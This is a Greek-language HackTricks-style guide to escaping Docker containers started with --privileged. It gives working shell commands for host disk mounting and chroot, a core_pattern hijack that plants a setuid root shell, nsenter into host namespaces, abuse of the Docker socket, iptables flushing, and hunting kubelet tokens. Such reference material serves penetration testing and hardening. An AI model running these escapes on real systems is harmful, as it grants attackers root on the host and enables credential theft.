# Απόδραση από `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ένα container που ξεκινά με `--privileged` δεν είναι το ίδιο με ένα κανονικό container με ένα ή δύο επιπλέον permissions. Στην πράξη, το `--privileged` αφαιρεί ή εξασθενεί αρκετές από τις προεπιλεγμένες runtime προστασίες που κανονικά κρατούν το workload μακριά από επικίνδυνους πόρους του host. Το ακριβές αποτέλεσμα εξαρτάται ακόμα από το runtime και το host, αλλά για Docker το συνηθισμένο αποτέλεσμα είναι:

- all capabilities are granted
- the device cgroup restrictions are lifted
- many kernel filesystems stop being mounted read-only
- default masked procfs paths disappear
- seccomp filtering is disabled
- AppArmor confinement is disabled
- SELinux isolation is disabled or replaced with a much broader label

Το σημαντικό αποτέλεσμα είναι ότι ένα privileged container συνήθως δεν χρειάζεται κάποιο λεπτό kernel exploit. Σε πολλές περιπτώσεις μπορεί απλά να αλληλεπιδράσει απευθείας με host devices, host-facing kernel filesystems, ή runtime interfaces και στη συνέχεια να pivot-άρει σε ένα host shell.

## Τι το `--privileged` Δεν Αλλάζει Αυτόματα

Το `--privileged` δεν ενώνει αυτόματα τα host PID, network, IPC, ή UTS namespaces. Ένα privileged container μπορεί ακόμα να έχει ιδιωτικά namespaces. Αυτό σημαίνει ότι κάποιες αλυσίδες απόδρασης απαιτούν μια επιπλέον προϋπόθεση όπως:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Αυτές οι προϋποθέσεις είναι συχνά εύκολο να ικανοποιηθούν σε πραγματικές λανθασμένες ρυθμίσεις, αλλά είναι εννοιολογικά ξεχωριστές από το ίδιο το `--privileged`.

## Διαδρομές Απόδρασης

### 1. Προσάρτηση του host δίσκου μέσω εκτεθειμένων συσκευών

Ένα privileged container συνήθως βλέπει πολύ περισσότερα device nodes κάτω από `/dev`. Εάν η host block device είναι ορατή, η απλούστερη απόδραση είναι να την προσαρτήσετε και να κάνετε `chroot` στο σύστημα αρχείων του host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Εάν το root partition δεν είναι προφανές, απαρίθμησε πρώτα το block layout:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Αν η πρακτική οδός είναι να φυτέψετε έναν setuid helper σε ένα εγγράψιμο host mount αντί να χρησιμοποιήσετε το `chroot`, θυμηθείτε ότι δεν κάθε filesystem σέβεται το setuid bit. Ένας γρήγορος έλεγχος ικανοτήτων στην πλευρά του host είναι:
```bash
mount | grep -v "nosuid"
```
Αυτό είναι χρήσιμο επειδή εγγράψιμα μονοπάτια κάτω από filesystems με `nosuid` είναι πολύ λιγότερο ενδιαφέροντα για τις κλασικές ροές εργασίας «drop a setuid shell and execute it later».

Οι εξασθενημένες προστασίες που καταχρώνται εδώ είναι:

- πλήρης έκθεση συσκευών
- ευρείες capabilities, ειδικά `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Προσάρτηση ή επαναχρησιμοποίηση ενός host bind mount και `chroot`

Αν το host root filesystem είναι ήδη mounted μέσα στο container, ή αν το container μπορεί να δημιουργήσει τα απαραίτητα mounts επειδή είναι privileged, ένα host shell βρίσκεται συχνά μόνο ένα `chroot` μακριά:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Εάν δεν υπάρχει host root bind mount, αλλά είναι δυνατή η πρόσβαση στο host storage, δημιούργησε ένα:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Αυτό το μονοπάτι εκμεταλλεύεται:

- αποδυναμωμένους περιορισμούς mount
- πλήρεις capabilities
- έλλειψη MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Εκμετάλλευση εγγράψιμου `/proc/sys` ή `/sys`

Ένα από τα μεγάλα αποτελέσματα του `--privileged` είναι ότι οι προστασίες του procfs και sysfs γίνονται πολύ πιο αδύναμες. Αυτό μπορεί να εκθέσει host-facing διεπαφές του kernel που κανονικά είναι αποκρυμμένες ή προσαρτημένες ως μόνο για ανάγνωση.

Κλασικό παράδειγμα είναι το `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Άλλα μονοπάτια υψηλής αξίας περιλαμβάνουν:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
This path abuses:

- απουσία masked paths
- απουσία read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Χρήση Full Capabilities για Mount- ή Namespace-Based Escape

Ένα privileged container αποκτά τις capabilities που συνήθως αφαιρούνται από τα standard containers, όπως `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, και πολλές άλλες. Αυτό συχνά αρκεί για να μετατρέψει μια local foothold σε host escape μόλις υπάρξει κάποια άλλη εκτεθειμένη επιφάνεια.

Ένα απλό παράδειγμα είναι το mounting επιπλέον filesystems και η χρήση namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Αν το host PID είναι επίσης κοινό, το βήμα γίνεται ακόμη πιο σύντομο:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Αυτή η διαδρομή εκμεταλλεύεται:

- the default privileged capability set
- optional host PID sharing

Σχετικές σελίδες:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Απόδραση μέσω sockets του runtime

Ένα privileged container συχνά καταλήγει να έχει ορατή την host runtime κατάσταση ή τα sockets. Εάν ένα Docker, containerd, ή CRI-O socket είναι προσβάσιμο, η πιο απλή προσέγγιση είναι συχνά να χρησιμοποιήσετε το runtime API για να εκκινήσετε ένα δεύτερο container με πρόσβαση στο host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Για containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Αυτή η διαδρομή εκμεταλλεύεται:

- έκθεση του privileged runtime
- host bind mounts που δημιουργούνται μέσω του ίδιου του runtime

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Αφαίρεση παρενεργειών απομόνωσης δικτύου

`--privileged` από μόνο του δεν ενώνει το container στο host network namespace, αλλά αν το container έχει επίσης `--network=host` ή άλλη πρόσβαση στο host-network, ολόκληρο το network stack γίνεται μεταβλητό:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Αυτό δεν είναι πάντα ένα άμεσο host shell, αλλά μπορεί να επιφέρει denial of service, traffic interception, ή πρόσβαση σε loopback-only management services.

Σχετικές σελίδες:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Ανάγνωση host secrets και runtime state

Ακόμα κι αν ένα clean shell escape δεν είναι άμεσο, τα privileged containers συχνά έχουν αρκετή πρόσβαση για να διαβάσουν host secrets, kubelet state, runtime metadata, και τα filesystems των γειτονικών container:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Εάν το `/var` είναι host-mounted ή οι runtime directories είναι ορατοί, αυτό μπορεί να αρκεί για lateral movement ή cloud/Kubernetes credential theft ακόμη και πριν αποκτηθεί host shell.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Έλεγχοι

Ο σκοπός των ακόλουθων εντολών είναι να επιβεβαιώσει ποιες privileged-container escape families είναι άμεσα βιώσιμες.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Τι είναι ενδιαφέρον εδώ:

- ένα πλήρες capability set, ειδικά `CAP_SYS_ADMIN`
- έκθεση εγγράψιμου proc/sys
- ορατές συσκευές του host
- απουσία seccomp και MAC confinement
- runtime sockets ή host root bind mounts

Οποιοδήποτε από αυτά μπορεί να είναι αρκετό για post-exploitation. Πολλά μαζί συνήθως σημαίνουν ότι το container πρακτικά απέχει ένα ή δύο commands από host compromise.

## Σχετικές Σελίδες

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
